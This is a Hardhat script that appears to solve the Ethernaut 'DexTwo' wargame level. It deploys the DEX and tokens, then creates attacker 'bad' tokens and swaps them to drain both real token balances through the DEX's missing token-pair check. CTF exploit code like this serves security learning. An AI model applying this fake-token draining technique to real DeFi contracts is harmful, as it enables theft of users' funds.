
const hre = require("hardhat");

async function main() {

	const [deployer, signer0, signer1] = await hre.ethers.getSigners();

	const contract = await hre.ethers.deployContract("DexTwo", signer0);
	console.log("DexTwo deployed to address:", contract.address);

	const token1 = await hre.ethers.deployContract("SwappableToken", [contract.address, "token1", "t1", 110], signer0);
	console.log("Token 1 address:", token1.address);

	const token2 = await hre.ethers.deployContract("SwappableToken", [contract.address, "token2", "t2", 110], signer0);
	console.log("Token 2 address:", token2.address);

	await contract.setTokens(token1.address, token2.address);

	console.log("Contract token 1:", await contract.token1());
	console.log("Contract token 2:", await contract.token2());

	await token1.transfer(contract.address, 100);
	await token1.transfer(deployer.address, 10);

	await token2.transfer(contract.address, 100);
	await token2.transfer(deployer.address, 10);

	// const contractAddress = "0xf4A526eC64195B3950943fB0AAD24A5830887E64";
	// const token1Address = "0x7Fc8aC2811d0afa7466F107f9994A8cC0Ae78B7c";
	// const token2Address = "0xD6Ac200b1a617563e80b693936B332baCE7Fa3Bc";
	const contractAddress = contract.address;
	const token1Address = token1.address;
	const token2Address = token2.address;

	const myContract = await hre.ethers.getContractAt("DexTwo", contractAddress, deployer);
	const myToken1 = await hre.ethers.getContractAt("SwappableToken", token1Address, deployer);
	const myToken2 = await hre.ethers.getContractAt("SwappableToken", token2Address, deployer);
	// const token1 = myToken1;
	// const token2 = myToken2;
	// const contract = myContract;

	const badToken1 = await hre.ethers.deployContract("TestDexTwoERC20", [1, contract.address], deployer);
	// const badToken1 = await hre.ethers.getContractAt("TestDexTwoERC20", "0xCf817321009E67C6e49c53968aC35Cfc4670D4fb", deployer);
	console.log("Bad token 1 address:", badToken1.address);

	const badToken2 = await hre.ethers.deployContract("TestDexTwoERC20", [1, contract.address], deployer);
	// const badToken2 = await hre.ethers.getContractAt("TestDexTwoERC20",	"0xA6373cB2c917c64E31621471a3bA6e41643DF158", deployer);
	console.log("Bad token 2 address:", badToken2.address);

	let txn;

	console.log("Balance of dex2:", await contract.balanceOf(token1.address, contract.address), await contract.balanceOf(badToken1.address, contract.address));
	console.log("Balance of deployer:", await token1.balanceOf(deployer.address), await badToken1.balanceOf(deployer.address));

	console.log("Balance of dex2:", await contract.balanceOf(token2.address, contract.address), await contract.balanceOf(badToken2.address, contract.address));
	console.log("Balance of deployer:", await token2.balanceOf(deployer.address), await badToken2.balanceOf(deployer.address));

	txn = await badToken1.increaseAllowance(contract.address, hre.ethers.constants.MaxUint256);
	await txn.wait();
	txn = await badToken2.increaseAllowance(contract.address, hre.ethers.constants.MaxUint256);
	await txn.wait();

	console.log('Allownace of dex2:', await badToken1.allowance(deployer.address, contract.address), await badToken2.allowance(deployer.address, contract.address));

	console.log("Swap price:", await myContract.getSwapAmount(badToken1.address, token1.address, 1));
	txn = await myContract.swap(badToken1.address, token1.address, 1);
	await txn.wait();

	console.log("Swap price:", await myContract.getSwapAmount(badToken2.address, token2.address, 1));
	txn = await myContract.swap(badToken2.address, token2.address, 1);
	await txn.wait();

	console.log("Balance of dex2:", await contract.balanceOf(token1.address, contract.address), await contract.balanceOf(badToken1.address, contract.address));
	console.log("Balance of deployer:", await token1.balanceOf(deployer.address), await badToken1.balanceOf(deployer.address));

	console.log("Balance of dex2:", await contract.balanceOf(token2.address, contract.address), await contract.balanceOf(badToken2.address, contract.address));
	console.log("Balance of deployer:", await token2.balanceOf(deployer.address), await badToken2.balanceOf(deployer.address));
}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
